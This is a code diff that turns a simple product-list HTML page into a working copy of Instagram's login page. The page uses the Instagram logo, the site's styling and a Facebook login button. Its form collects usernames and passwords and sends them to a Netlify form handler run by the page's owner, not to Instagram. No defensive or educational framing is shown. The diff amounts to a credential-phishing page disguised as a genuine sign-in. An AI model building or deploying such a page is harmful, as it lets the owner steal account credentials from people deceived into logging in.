@@ -3,66 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Product List</title>
+    <title>Instagram Login</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            padding: 20px;
-        }
-        .product-container {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 20px;
-        }
-        .product {
-            background-color: #fff;
-            padding: 15px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 200px;
-            text-align: center;
-        }
-        .product-name {
-            font-size: 18px;
-            font-weight: bold;
-        }
-        .product-price {
-            font-size: 16px;
-            color: #28a745;
-        }
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      
+      body {
+        font-family: Arial, sans-serif;
+        background: #fafafa;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+      
+      .login-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        background: white;
+        width: 100%;
+        max-width: 350px;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+      }
+      
+      .login-form {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+      
+      .logo {
+        width: 90px;
+        margin-bottom: 20px;
+      }
+      
+      input {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        border: 1px solid #dbdbdb;
+        border-radius: 12px;
+        font-size: 14px;
+        color: #262626;
+      }
+      
+      input::placeholder {
+        color: #8e8e8e;
+      }
+      
+      button {
+        width: 100%;
+        padding: 10px;
+        background-color: #0095f6;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        font-size: 14px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+      }
+      
+      button:hover {
+        background-color: #007bb5;
+      }
+      
+      .separator {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin: 20px 0;
+        width: 100%;
+      }
+      
+      .separator span {
+        color: #8e8e8e;
+        font-size: 14px;
+      }
+      
+      .facebook-login-btn {
+        width: 100%;
+        padding: 10px;
+        background-color: #385185;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        font-size: 14px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+      }
+      
+      .facebook-login-btn:hover {
+        background-color: #2e3e6b;
+      }
+      
+      .forgot-password {
+        color: #0095f6;
+        font-size: 14px;
+        text-decoration: none;
+        margin-top: 10px;
+        text-align: center;
+      }
+      
+      .signup-container {
+        display: flex;
+        justify-content: center;
+        margin-top: 15px;
+        font-size: 14px;
+        color: #8e8e8e;
+      }
+      
+      .signup-container a {
+        color: #0095f6;
+        text-decoration: none;
+      }
     </style>
 </head>
 <body>
-
-    <h1>Product List</h1>
-    <div class="product-container">
-        <div class="product">
-            <div class="data">
-                <div class="name">Product 1</div>
-                <div class="price">$25.99</div>
+    <div class="login-container">
+        <div class="login-form">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram" class="logo">
+            <form name="login-form" method="POST" data-netlify="true" action="/thank-you">
+                <!-- Hidden field to allow Netlify form processing -->
+                <input type="hidden" name="form-name" value="login-form" />
+                
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+            <div class="separator">
+                <span>OR</span>
             </div>
+            <button class="facebook-login-btn">Log in with Facebook</button>
+            <a href="#" class="forgot-password">Forgot password?</a>
         </div>
-        <div class="product">
-             <div class="data">
-                <div class="name">Product 2</div>
-                <div class="price">$30.00</div>
-             </div>
-        </div>
-        <div class="product">
-            <div class="name">Product 3</div>
-            <div class="price">$15.49</div>
-        </div>
-        <div class="product">
-            <div class="name">Product 4</div>
-            <div class="price">$20.00</div>
-        </div>
-        <div class="product">
-            
-            <div class="name">Product 5</div>
-            <div class="price">$50.99</div>
+        <div class="signup-container">
+            <span>Don't have an account? <a href="#">Sign up</a></span>
         </div>
     </div>
-
 </body>
 </html>
